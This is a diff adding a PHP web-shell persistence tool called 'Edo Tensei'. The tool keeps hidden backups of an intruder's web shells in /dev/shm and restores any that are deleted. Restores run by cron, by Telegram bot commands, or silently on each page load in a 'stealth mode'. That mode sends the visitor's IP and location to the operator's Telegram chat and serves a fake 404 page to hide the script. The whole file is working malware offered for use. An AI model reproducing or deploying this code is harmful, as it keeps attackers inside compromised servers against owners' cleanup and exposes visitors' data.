@@ -1,0 +1,338 @@
+<?php
+$DOCUMENT_ROOT = rtrim($_SERVER['DOCUMENT_ROOT'] ?? dirname($_SERVER['SCRIPT_FILENAME']), '/');
+$configFile = __DIR__ . '/.cfg';
+$masterFile = __FILE__;
+
+// ========== FUNGSI DASAR ==========
+function loadConfig() {
+    global $configFile, $DOCUMENT_ROOT;
+    if (!file_exists($configFile)) {
+        return ['shells' => [], 'telegram_token' => '', 'telegram_chat_id' => '', 'telegram_enabled' => false];
+    }
+    $config = json_decode(file_get_contents($configFile), true);
+    if (!isset($config['shells'])) $config['shells'] = [];
+    if (!isset($config['telegram_enabled'])) $config['telegram_enabled'] = false;
+    return $config;
+}
+
+function saveConfig($config) {
+    global $configFile;
+    file_put_contents($configFile, json_encode($config, JSON_PRETTY_PRINT));
+}
+
+function backupFile($filePath) {
+    if (!file_exists($filePath)) return false;
+    $backupDir = '/dev/shm/.edobackup/';
+    if (!is_dir($backupDir)) mkdir($backupDir, 0777, true);
+    $backupFile = $backupDir . md5($filePath) . '.bak';
+    file_put_contents($backupFile, file_get_contents($filePath));
+    chmod($backupFile, 0444);
+    return true;
+}
+
+function restoreFile($filePath) {
+    $backupDir = '/dev/shm/.edobackup/';
+    $backupFile = $backupDir . md5($filePath) . '.bak';
+    if (!file_exists($backupFile)) return false;
+    $dir = dirname($filePath);
+    if (!is_dir($dir)) mkdir($dir, 0755, true);
+    copy($backupFile, $filePath);
+    chmod($filePath, 0644);
+    return true;
+}
+
+function sendTelegram($token, $chatId, $message) {
+    if (empty($token) || empty($chatId)) return false;
+    $url = "https://api.telegram.org/bot{$token}/sendMessage";
+    $data = ['chat_id' => $chatId, 'text' => $message, 'parse_mode' => 'HTML'];
+    $opts = ['http' => ['method' => 'POST', 'header' => 'Content-Type: application/x-www-form-urlencoded', 'content' => http_build_query($data), 'timeout' => 5]];
+    @file_get_contents($url, false, stream_context_create($opts));
+    return true;
+}
+
+function getIPLocation($ip) {
+    if (in_array($ip, ['127.0.0.1', '::1', 'localhost', ''])) return 'Local';
+    $data = @file_get_contents("http://ip-api.com/json/{$ip}?fields=status,country,city");
+    if ($data) {
+        $loc = json_decode($data, true);
+        if ($loc['status'] == 'success') return $loc['city'] . ', ' . $loc['country'];
+    }
+    return 'Unknown';
+}
+
+// ========== PANEL ==========
+function showPanel() {
+    global $DOCUMENT_ROOT;
+    $config = loadConfig();
+    $webhookUrl = (isset($_SERVER['HTTPS']) ? 'https://' : 'http://') . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'] . '?webhook=1';
+    
+    if (isset($_POST['save_shells'])) {
+        $config['shells'] = array_filter(array_map('trim', $_POST['shells'] ?? []));
+        saveConfig($config);
+        foreach ($config['shells'] as $shell) {
+            $absPath = $DOCUMENT_ROOT . '/' . ltrim($shell, '/');
+            if (file_exists($absPath)) backupFile($absPath);
+        }
+        echo "<script>alert('Shells saved!');</script>";
+    }
+    
+    if (isset($_POST['save_telegram'])) {
+        $config['telegram_token'] = trim($_POST['telegram_token'] ?? '');
+        $config['telegram_chat_id'] = trim($_POST['telegram_chat_id'] ?? '');
+        $config['telegram_enabled'] = isset($_POST['telegram_enabled']);
+        saveConfig($config);
+        
+        if ($config['telegram_enabled'] && !empty($config['telegram_token'])) {
+            $url = "https://api.telegram.org/bot{$config['telegram_token']}/setWebhook?url=" . urlencode($webhookUrl);
+            @file_get_contents($url);
+            sendTelegram($config['telegram_token'], $config['telegram_chat_id'], "✅ Edo Tensei Bot Active!\n\n📡 Webhook connected\n🛡️ Monitoring enabled\n\nCommands:\n/status - Check status\n/restore - Restore all shells\n/backup - Backup all shells\n/help - Menu");
+            echo "<script>alert('Telegram connected!');</script>";
+        }
+    }
+    
+    if (isset($_GET['restore'])) {
+        $count = 0;
+        foreach ($config['shells'] as $shell) {
+            $absPath = $DOCUMENT_ROOT . '/' . ltrim($shell, '/');
+            if (restoreFile($absPath)) $count++;
+        }
+        if ($config['telegram_enabled']) {
+            sendTelegram($config['telegram_token'], $config['telegram_chat_id'], "🔄 Restore completed\nRestored: $count files\nTime: " . date('Y-m-d H:i:s'));
+        }
+        echo "<script>alert('Restored: $count files');</script>";
+    }
+    
+    if (isset($_GET['backup'])) {
+        $count = 0;
+        foreach ($config['shells'] as $shell) {
+            $absPath = $DOCUMENT_ROOT . '/' . ltrim($shell, '/');
+            if (file_exists($absPath)) {
+                backupFile($absPath);
+                $count++;
+            }
+        }
+        if ($config['telegram_enabled']) {
+            sendTelegram($config['telegram_token'], $config['telegram_chat_id'], "💾 Backup completed\nBacked up: $count files\nTime: " . date('Y-m-d H:i:s'));
+        }
+        echo "<script>alert('Backup: $count files');</script>";
+    }
+    
+    ?>
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Edo Tensei Panel</title>
+        <style>
+            *{margin:0;padding:0;box-sizing:border-box;}
+            body{background:#0a0c15;font-family:'Segoe UI',Arial,sans-serif;color:#eef5ff;padding:20px;}
+            .container{max-width:1000px;margin:0 auto;}
+            .header{text-align:center;padding:30px;background:linear-gradient(135deg,#0a0c15,#151a2a);border-radius:20px;margin-bottom:30px;border:1px solid #2a2f45;}
+            .header h1{font-size:2.5em;background:linear-gradient(135deg,#00ff9d,#00cc7a);-webkit-background-clip:text;background-clip:text;color:transparent;}
+            .card{background:#151a2a;border-radius:16px;border:1px solid #2a2f45;margin-bottom:30px;overflow:hidden;}
+            .card-header{padding:20px 25px;background:#1a1f33;border-bottom:1px solid #2a2f45;font-weight:bold;}
+            .card-body{padding:25px;}
+            .form-group{margin-bottom:20px;}
+            label{display:block;margin-bottom:8px;color:#8a92b0;}
+            input[type="text"]{width:100%;padding:12px;background:#1a1f33;border:1px solid #2a2f45;border-radius:12px;color:#eef5ff;}
+            .shell-row{display:flex;gap:10px;margin-bottom:10px;}
+            .shell-row span{background:#2a2f45;padding:10px;border-radius:10px;min-width:45px;text-align:center;}
+            .shell-row input{flex:1;}
+            button{background:linear-gradient(135deg,#00ff9d,#00cc7a);color:#0a0c15;border:none;padding:12px 24px;border-radius:40px;font-weight:bold;cursor:pointer;margin-right:10px;margin-top:10px;}
+            button.secondary{background:#2a2f45;color:#eef5ff;}
+            .info-box{background:#1a1f33;border-radius:12px;padding:15px;margin-top:20px;font-size:12px;}
+            .grid-2{display:grid;grid-template-columns:1fr 1fr;gap:25px;}
+            @media (max-width:700px){.grid-2{grid-template-columns:1fr;}}
+            .badge{display:inline-block;padding:5px 12px;border-radius:20px;background:#00ff9d20;color:#00ff9d;border:1px solid #00ff9d;}
+            .url-code{background:#0a0c15;padding:10px;border-radius:8px;font-family:monospace;font-size:11px;margin:5px 0;}
+            .footer{text-align:center;padding:20px;color:#4a5070;}
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <div class="header">
+                <h1>⚡ Edo Tensei</h1>
+                <p>Auto Restore • Telegram Notify</p>
+                <div style="margin-top:15px;"><span class="badge">📁 <?= htmlspecialchars($DOCUMENT_ROOT) ?></span></div>
+            </div>
+            <div class="grid-2">
+                <div class="card">
+                    <div class="card-header">🛡️ Protected Shells</div>
+                    <div class="card-body">
+                        <form method="POST">
+                            <?php for($i=0;$i<10;$i++): $val = $config['shells'][$i] ?? ''; ?>
+                            <div class="shell-row"><span><?= str_pad($i+1,2,'0',STR_PAD_LEFT) ?></span><input type="text" name="shells[]" placeholder="path/to/shell.php" value="<?= htmlspecialchars($val) ?>"></div>
+                            <?php endfor; ?>
+                            <button type="submit" name="save_shells">💾 Save Shells</button>
+                            <a href="?restore=1"><button type="button" class="secondary">🔄 Restore All</button></a>
+                            <a href="?backup=1"><button type="button" class="secondary">💾 Backup All</button></a>
+                        </form>
+                    </div>
+                </div>
+                <div class="card">
+                    <div class="card-header">🤖 Telegram Bot</div>
+                    <div class="card-body">
+                        <form method="POST">
+                            <div class="form-group"><label>🤖 Bot Token</label><input type="text" name="telegram_token" placeholder="1234567890:ABCdefGHIjklMNOpqrsTUVwxyz" value="<?= htmlspecialchars($config['telegram_token'] ?? '') ?>"></div>
+                            <div class="form-group"><label>📱 Chat ID</label><input type="text" name="telegram_chat_id" placeholder="123456789" value="<?= htmlspecialchars($config['telegram_chat_id'] ?? '') ?>"></div>
+                            <div class="form-group"><label><input type="checkbox" name="telegram_enabled" value="1" <?= ($config['telegram_enabled'] ?? false) ? 'checked' : '' ?>> ✅ Enable Telegram</label></div>
+                            <button type="submit" name="save_telegram">🔌 Connect Bot</button>
+                        </form>
+                        <?php if (!empty($config['telegram_token']) && ($config['telegram_enabled'] ?? false)): ?>
+                        <div class="info-box" style="margin-top:15px;background:#00ff9d10;">✅ Telegram: CONNECTED<br>🤖 Bot: <?= substr($config['telegram_token'], 0, 25) ?>...<br>📱 Chat ID: <?= htmlspecialchars($config['telegram_chat_id']) ?></div>
+                        <?php endif; ?>
+                    </div>
+                </div>
+            </div>
+            <div class="card">
+                <div class="card-header">📡 Access URLs</div>
+                <div class="card-body">
+                    <div class="url-code">Panel: <?= $_SERVER['SCRIPT_NAME'] ?>?panel</div>
+                    <div class="url-code">Cron Job: <?= $_SERVER['SCRIPT_NAME'] ?>?cron=1</div>
+                    <div class="url-code">Telegram Webhook: <?= $_SERVER['SCRIPT_NAME'] ?>?webhook=1</div>
+                </div>
+            </div>
+            <div class="footer">Edo Tensei • Auto Restore • Telegram Notify</div>
+        </div>
+    </body>
+    </html>
+    <?php
+}
+
+// ========== TELEGRAM WEBHOOK (DIPERBAIKI) ==========
+function handleWebhook() {
+    global $DOCUMENT_ROOT; // <-- PENTING: ambil global
+    
+    $config = loadConfig();
+    if (!$config['telegram_enabled'] || empty($config['telegram_token'])) {
+        http_response_code(403);
+        die('Telegram disabled');
+    }
+    
+    $input = file_get_contents('php://input');
+    if (!$input) return;
+    
+    $update = json_decode($input, true);
+    if (isset($update['message'])) {
+        $chatId = $update['message']['chat']['id'];
+        $text = trim($update['message']['text'] ?? '');
+        
+        // Validasi chat_id
+        if ($chatId != $config['telegram_chat_id']) {
+            sendTelegram($config['telegram_token'], $config['telegram_chat_id'], "⚠️ Unauthorized access from chat_id: $chatId");
+            return;
+        }
+        
+        switch($text) {
+            case '/status':
+                global $masterFile;
+                $msg = "🔮 Edo Tensei Status\n\n";
+                $msg .= "📁 Master: " . (file_exists($masterFile) ? "✅ ACTIVE" : "❌ MISSING") . "\n";
+                $msg .= "🛡️ Shells: " . count($config['shells']) . " protected\n";
+                $msg .= "🕐 Time: " . date('Y-m-d H:i:s');
+                sendTelegram($config['telegram_token'], $chatId, $msg);
+                break;
+                
+            case '/restore':
+                // PROSES RESTORE VIA TELEGRAM
+                $restored = 0;
+                $failed = 0;
+                $details = [];
+                
+                foreach ($config['shells'] as $shell) {
+                    $absPath = $DOCUMENT_ROOT . '/' . ltrim($shell, '/');
+                    if (restoreFile($absPath)) {
+                        $restored++;
+                        $details[] = "✅ " . basename($shell);
+                    } else {
+                        $failed++;
+                        $details[] = "❌ " . basename($shell) . " (no backup)";
+                    }
+                }
+                
+                $msg = "🔄 <b>Restore Completed!</b>\n\n";
+                $msg .= "✅ Restored: $restored files\n";
+                if ($failed > 0) $msg .= "❌ Failed: $failed files (no backup)\n\n";
+                $msg .= "<b>Details:</b>\n" . implode("\n", array_slice($details, 0, 10));
+                
+                sendTelegram($config['telegram_token'], $chatId, $msg);
+                break;
+                
+            case '/backup':
+                $backedup = 0;
+                foreach ($config['shells'] as $shell) {
+                    $absPath = $DOCUMENT_ROOT . '/' . ltrim($shell, '/');
+                    if (file_exists($absPath)) {
+                        backupFile($absPath);
+                        $backedup++;
+                    }
+                }
+                $msg = "💾 <b>Backup Completed!</b>\n\n";
+                $msg .= "📦 Backed up: $backedup files\n";
+                $msg .= "🕐 Time: " . date('Y-m-d H:i:s');
+                sendTelegram($config['telegram_token'], $chatId, $msg);
+                break;
+                
+            case '/help':
+                $msg = "🤖 <b>Edo Tensei Commands</b>\n\n";
+                $msg .= "/status - Check system status\n";
+                $msg .= "/restore - Restore all missing shells\n";
+                $msg .= "/backup - Backup all shells\n";
+                $msg .= "/help - Show this menu";
+                sendTelegram($config['telegram_token'], $chatId, $msg);
+                break;
+                
+            default:
+                if (!empty($text)) {
+                    sendTelegram($config['telegram_token'], $chatId, "❓ Unknown command.\nType /help for available commands.");
+                }
+        }
+    }
+}
+
+// ========== MAIN ==========
+
+if (isset($_GET['panel'])) {
+    showPanel();
+    exit;
+}
+
+if (isset($_GET['webhook'])) {
+    handleWebhook();
+    exit;
+}
+
+if (isset($_GET['cron'])) {
+    $config = loadConfig();
+    $restored = 0;
+    foreach ($config['shells'] as $shell) {
+        $absPath = $DOCUMENT_ROOT . '/' . ltrim($shell, '/');
+        if (restoreFile($absPath)) $restored++;
+    }
+    die("Auto-restore completed at " . date('Y-m-d H:i:s') . " - Restored: $restored");
+}
+
+if (isset($_GET['status'])) {
+    $config = loadConfig();
+    echo "=== Edo Tensei ===\n";
+    echo "Shells: " . count($config['shells']) . "\n";
+    echo "Telegram: " . (($config['telegram_enabled'] ?? false) ? "ON" : "OFF") . "\n";
+    exit;
+}
+
+// ========== STEALTH MODE ==========
+$config = loadConfig();
+foreach ($config['shells'] as $shell) {
+    $absPath = $DOCUMENT_ROOT . '/' . ltrim($shell, '/');
+    if (!file_exists($absPath)) {
+        if (restoreFile($absPath) && ($config['telegram_enabled'] ?? false)) {
+            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'unknown';
+            $location = getIPLocation($ip);
+            sendTelegram($config['telegram_token'], $config['telegram_chat_id'], 
+                "⚠️ <b>FILE RESTORED</b>\n\n📁 File: " . basename($shell) . "\n📍 IP: $ip\n🌍 $location\n🕐 " . date('Y-m-d H:i:s'));
+        }
+    }
+}
+
+header('HTTP/1.1 404 Not Found');
+echo "<html><head><title>404 Not Found</title></head><body><h1>404 Not Found</h1></body></html>";
+?>
